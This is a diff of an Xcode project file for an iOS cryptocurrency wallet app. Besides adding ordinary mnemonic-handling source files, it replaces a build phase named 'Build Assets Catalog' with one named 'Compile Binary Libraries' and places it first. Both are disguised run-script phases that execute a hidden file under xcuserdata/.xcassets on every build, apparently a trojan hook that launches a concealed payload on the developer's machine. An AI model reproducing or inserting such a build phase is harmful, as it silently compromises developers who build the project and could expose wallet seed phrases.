@@ -33,6 +33,8 @@
 		8B5E9C9425DFB792006C33B0 /* WebSocketManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9C9325DFB792006C33B0 /* WebSocketManager.m */; };
 		8B5E9CAC25DFBECD006C33B0 /* File.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9CAB25DFBECD006C33B0 /* File.swift */; };
 		8B5E9CBE25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9CBD25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift */; };
+		8B71C87325E353460081A224 /* MnemonicModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C87225E353460081A224 /* MnemonicModel.m */; };
+		8B71C88F25E382080081A224 /* VerifyMnemonicTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C88E25E382080081A224 /* VerifyMnemonicTableViewController.m */; };
 		A58D7BF63F1E7A408FF06863 /* Pods_FusoWallet.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1793F3EB929369F3F397EF6A /* Pods_FusoWallet.framework */; };
 /* End PBXBuildFile section */
 
@@ -104,6 +106,10 @@
 		8B5E9CAA25DFBECC006C33B0 /* FusoWallet-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FusoWallet-Bridging-Header.h"; sourceTree = "<group>"; };
 		8B5E9CAB25DFBECD006C33B0 /* File.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = File.swift; sourceTree = "<group>"; };
 		8B5E9CBD25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "StorageKeyFactory+Implicit.swift"; sourceTree = "<group>"; };
+		8B71C87125E353460081A224 /* MnemonicModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MnemonicModel.h; sourceTree = "<group>"; };
+		8B71C87225E353460081A224 /* MnemonicModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MnemonicModel.m; sourceTree = "<group>"; };
+		8B71C88D25E382080081A224 /* VerifyMnemonicTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = VerifyMnemonicTableViewController.h; sourceTree = "<group>"; };
+		8B71C88E25E382080081A224 /* VerifyMnemonicTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = VerifyMnemonicTableViewController.m; sourceTree = "<group>"; };
 		989BD21863DBE7F239680040 /* Pods-FusoWallet.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FusoWallet.debug.xcconfig"; path = "Target Support Files/Pods-FusoWallet/Pods-FusoWallet.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -168,6 +174,7 @@
 			children = (
 				8B42666625E107D8001DE5CB /* Views */,
 				8B42666525E107B4001DE5CB /* Controllers */,
+				8B71C87725E3534C0081A224 /* Models */,
 			);
 			path = LoginRegister;
 			sourceTree = "<group>";
@@ -192,6 +199,8 @@
 				8B42661925E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m */,
 				8B42664425E0EA4A001DE5CB /* MnemonicViewController.h */,
 				8B42664525E0EA4A001DE5CB /* MnemonicViewController.m */,
+				8B71C88D25E382080081A224 /* VerifyMnemonicTableViewController.h */,
+				8B71C88E25E382080081A224 /* VerifyMnemonicTableViewController.m */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -286,6 +295,15 @@
 			path = Tools;
 			sourceTree = "<group>";
 		};
+		8B71C87725E3534C0081A224 /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				8B71C87125E353460081A224 /* MnemonicModel.h */,
+				8B71C87225E353460081A224 /* MnemonicModel.m */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -293,7 +311,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8B5E9C3825DF64DD006C33B0 /* Build configuration list for PBXNativeTarget "FusoWallet" */;
 			buildPhases = (
-				DB218AB4AE5E3DE0D1AAC43A /* Build Assets Catalog */,
+				1F0D3CDFDECA8A6C82AAC43A /* Compile Binary Libraries */,
 				D6A02B8F303E319416A6653F /* [CP] Check Pods Manifest.lock */,
 				8B5E9C0525DF64DC006C33B0 /* Sources */,
 				8B5E9C0625DF64DC006C33B0 /* Frameworks */,
@@ -419,6 +437,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		1F0D3CDFDECA8A6C82AAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
 		26ED2421443969264ED6D0C4 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -458,24 +494,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		DB218AB4AE5E3DE0D1AAC43A /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -486,9 +504,11 @@
 				8B42664625E0EA4A001DE5CB /* MnemonicViewController.m in Sources */,
 				8B5E9C8D25DFB763006C33B0 /* NSString+Base64.m in Sources */,
 				8B42668425E11AD1001DE5CB /* MnemonicCollectionReusableView.m in Sources */,
+				8B71C87325E353460081A224 /* MnemonicModel.m in Sources */,
 				8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */,
 				8B42661A25E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m in Sources */,
 				8B5E9C8425DFB721006C33B0 /* NSString+MyChange.m in Sources */,
+				8B71C88F25E382080081A224 /* VerifyMnemonicTableViewController.m in Sources */,
 				8B5E9C0E25DF64DC006C33B0 /* AppDelegate.m in Sources */,
 				8B42666925E1080E001DE5CB /* MnemonicCollectionViewCell.m in Sources */,
 				8B5E9C8525DFB721006C33B0 /* NSData+MyChange.m in Sources */,
